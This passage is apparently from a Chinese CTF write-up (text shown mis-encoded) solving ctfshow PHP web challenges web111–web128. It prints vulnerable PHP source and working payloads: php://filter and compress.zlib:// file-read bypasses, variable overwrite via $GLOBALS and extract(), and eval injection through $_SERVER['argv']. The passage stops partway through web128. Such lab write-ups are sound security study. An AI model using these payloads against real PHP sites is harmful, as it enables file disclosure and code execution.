<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;$v1,&amp;$v2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡ä¾ç„¶è€ƒç‚¹åœ¨äºå˜é‡è¦†ç›–(çŸ¥è¯†ç‚¹å¿˜è®°çš„è¯å»æ¸©ä¹ ä¸€ä¸‹web105)ï¼Œé¦–é€‰éœ€è¦<code>v1</code>å«æœ‰ctfshowæ‰èƒ½è¿‡æ­£åˆ™ï¼Œæ‰§è¡Œgetflagå‡½æ•°ï¼Œæ‰€ä»¥<code>v1=ctfshow</code>ï¼Œæ¥ç€å†getflagå‡½æ•°é‡Œï¼Œä¼šæŠŠv2çš„åœ°å€ä¼ ç»™v1ï¼Œæ¥ç€å†è¾“å‡ºv1ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpé‡Œçš„å…¨å±€å˜é‡GLOBALS</p>
<blockquote>
<p>$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p>
</blockquote>
<p>æ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS</span><br></pre></td></tr></table></figure>
<p>è¿‡ç¨‹å°±æ˜¯<code>$ctfshow=&amp;$GLOBALS</code>(å…¨å±€å˜é‡ä¸­ä¼šå«æœ‰flagçš„å˜é‡)ï¼Œæ¥ç€å†é€šè¿‡var_dumpè¾“å‡º$ctfshow</p>
<h3 id="web112"><a class="header-anchor" href="#web112">Â¶</a>web112</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆäº†è§£å‡ ä¸ªå‡½æ•°</p>
<blockquote>
<p><strong>is_file()</strong> å‡½æ•°æ£€æŸ¥æŒ‡å®šçš„æ–‡ä»¶åæ˜¯å¦æ˜¯æ­£å¸¸çš„æ–‡ä»¶</p>
<p><strong>filter()</strong> å‡½æ•°ç”¨äºå¯¹æ¥è‡ªéå®‰å…¨æ¥æºçš„æ•°æ®ï¼ˆæ¯”å¦‚ç”¨æˆ·è¾“å…¥ï¼‰è¿›è¡ŒéªŒè¯å’Œè¿‡æ»¤</p>
</blockquote>
<p>è¿™é‡Œé¦–å…ˆifè¯­å¥é‡Œéœ€è¦æˆ‘ä»¬ä¼ å…¥çš„ä¸æ˜¯æ–‡ä»¶ç±»å‹æ‰èƒ½æ‰§è¡Œhighlight_fileè¯­å¥æ¥è¯»å–flagæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªç»•è¿‡çš„è€ƒç‚¹ï¼Œæˆ‘ä»¬ä½¿ç”¨phpä¼ªåè®®å³å¯ï¼Œæ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web113"><a class="header-anchor" href="#web113">Â¶</a>web113</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šè¿‡æ»¤äº†filterï¼Œé‚£æˆ‘ä»¬æ¢å¦ä¸€ä¸ªåè®®ï¼Œä½¿ç”¨å‹ç¼©æµzlib://<br>
å®˜æ–¹phpæ–‡æ¡£åœ°å€ï¼š<a href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a><br>
æ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web114"><a class="header-anchor" href="#web114">Â¶</a>web114</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠcompressè¿‡æ»¤äº†ï¼Œä½†æ²¡è¿‡æ»¤filterï¼Œå’Œweb112ä¸€æ ·çš„åšæ³•ï¼Œpaylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<h3 id="web115"><a class="header-anchor" href="#web115">Â¶</a>web115</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$num</span>)</span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim($num)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter($num)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”¨äº†is_numericæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯æ•°å­—ï¼Œå¹¶ä¸”ifæ¡ä»¶é‡Œè§„å®štrim($num)ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„å­—ç¬¦ä¸èƒ½ç­‰äº36ï¼Œä½†åé¢çš„iféœ€è¦ç­‰äº36æ‰èƒ½è¾“å‡ºflagï¼Œè€Œä¸”è‡ªå®šä¹‰å‡½æ•°filterä¹ŸæŠŠ16è¿›åˆ¶å’Œ8è¿›åˆ¶ç­‰ç­‰å°æ­»äº†ï¼Œæˆ‘ä»¬å†™ä¸ªè„šæœ¬çœ‹çœ‹æœ‰ä»€ä¹ˆå­—ç¬¦å¯ä»¥åˆ©ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">128</span>; $i++) &#123;</span><br><span class="line">    $a = chr($i) . <span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (trim($a) !== <span class="string">&#x27;36&#x27;</span> &amp;&amp; is_numeric($a)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr($i)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°<code>%0C</code>ï¼Œä¹Ÿå°±æ˜¯<code>\f</code>åˆ†é¡µç¬¦å¯ä»¥åˆ©ç”¨ï¼Œä¸ä¼šè¢«trimè¿‡æ»¤æ‰ï¼Œæ‰€ä»¥paylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?num&#x3D;%0c36</span><br></pre></td></tr></table></figure>
<h3 id="web123"><a class="header-anchor" href="#web123">Â¶</a>web123</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°åé¢æœ‰ä¸ªeval()å‡½æ•°ä¼šæ‰§è¡Œ<code>$c</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å…³æ³¨$cå’Œifåˆ¤æ–­éœ€è¦çš„ä¸¤ä¸ªpostå³å¯<br>
åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰<code>ç©ºæ ¼ã€+ã€[</code>åˆ™ä¼šè¢«è½¬åŒ–ä¸º<code>_</code>ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡º<code>CTF_SHOW.COM</code>è¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰<code>.</code>)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥<code>[</code>ï¼Œå®ƒè¢«è½¬åŒ–ä¸º<code>_</code>ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢ï¼Œæ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">postï¼š</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag</span><br></pre></td></tr></table></figure>
<h3 id="web125"><a class="header-anchor" href="#web125">Â¶</a>web125</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šè¿‡æ»¤äº†flagå’Œechoå…³é”®å­—ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨highlight_fileæ¥æ˜¾ç¤ºæ–‡ä»¶ï¼Œå› ä¸ºflagè¢«åœ¨postä¸­è¢«banäº†ï¼Œæˆ‘ä»¬é€šè¿‡getæ¥ä¼ å‚ï¼Œæ‰€ä»¥payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?dotast&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;highlight_file($_GET[dotast])</span><br></pre></td></tr></table></figure>
<h3 id="web126"><a class="header-anchor" href="#web126">Â¶</a>web126</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, $c) &amp;&amp; strlen($c)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æ­£åˆ™åŒ¹é…äº†ä¸€äº›å…³é”®å­—æ¯ï¼Œå¯¼è‡´ä¸èƒ½ç»§ç»­ç”¨ä¸Šé¢˜paylaodï¼›è§‚å¯Ÿåˆ°è¿™é‡Œæ˜¯æœ‰<code>$_SERVER['argv']</code></p>
<blockquote>
<p><code>$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']</code><br>
query stringæ˜¯Uniform Resource Locator (URL)çš„ä¸€éƒ¨åˆ†, å…¶ä¸­åŒ…å«ç€éœ€è¦ä¼ ç»™web applicationçš„æ•°æ®</p>
</blockquote>
<p>è¿™é‡Œè¿›è¡Œäº†æœ¬åœ°æµ‹è¯•ï¼Œæ³¨æ„éœ€è¦åœ¨php.iniå¼€å¯register_argc_argvé…ç½®é¡¹ï¼Œæµ‹è¯•ä»£ç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web126/3%29X%28T_JR3%60AOE%25FJON%7D%5D%7BX2.png" alt=""></p>
<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬getä¼ å…¥å˜é‡èµ‹å€¼è¯­å¥ï¼Œæ¥ç€åœ¨posté‡Œé¢æ¥æ‰§è¡Œè¿™ä¸ªèµ‹å€¼è¯­å¥å°±å¯ä»¥å®Œç¾ç»•è¿‡ï¼Œpayloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?$fl0g&#x3D;flag_give_me;</span><br><span class="line"></span><br><span class="line">postï¼š</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</span><br></pre></td></tr></table></figure>
<h3 id="web127"><a class="header-anchor" href="#web127">Â¶</a>web127</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¼€å¯äº†<code>$_SERVER['QUERY_STRING']</code>ï¼Œä¸Šé¢˜å·²ç»è§£é‡Šè¿‡ï¼Œè¿™é‡Œç”¨äº†ä¸€ä¸ªextract()å‡½æ•°</p>
<blockquote>
<p><strong>extract()</strong> å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼</p>
</blockquote>
<p>ä¸¾ä¾‹å°±æ˜¯<code>?a=2</code>ï¼Œå°±ä¼šå˜æˆ<code>$a=2</code>ï¼Œè¿™é‡Œ<code>ctf_show</code>æœ‰ä¸ª<code>_</code>éœ€è¦æ„é€ ï¼Œå‰é¢è¯´è¿‡phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰<code>ç©ºæ ¼ã€+ã€[</code>åˆ™ä¼šè¢«è½¬åŒ–ä¸º<code>_</code>ï¼Œè¿™é‡Œç©ºæ ¼æ²¡æœ‰è¢«banï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä½¿ç”¨ç©ºæ ¼ï¼Œpayloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ctf show&#x3D;ilove36d</span><br></pre></td></tr></table></figure>
<h3 id="web128"><a class="header-anchor" href="#web128">Â¶</a>web128</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™é‡ŒåµŒå¥—äº†ä¸¤å±‚çš„call_user_funcï¼Œå…³äºcall_user_funcå‡½æ•°åœ¨å‰é¢çš„é¢˜ä¸­å·²ç»è®²è¿‡ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥å†å›é¡¾ä¸€ä¸‹ï¼ŒåŒæ—¶ä»‹ç»æ–°çš„çŸ¥è¯†ç‚¹</p>
<blockquote>
<p><strong>call_user_func()</strong> å‡½æ•°æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°éƒ½æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°</p>
</blockquote>
<p>è¿™é‡Œå¯¹<code>$f1</code>è¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤ï¼Œä¸èƒ½ä¸ºæ•°å­—å’Œå­—æ¯ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨gettextæ‹“å±•ï¼Œå¼€å¯æ­¤æ‹“å±•<code>_() ç­‰æ•ˆäº gettext()</code></p>
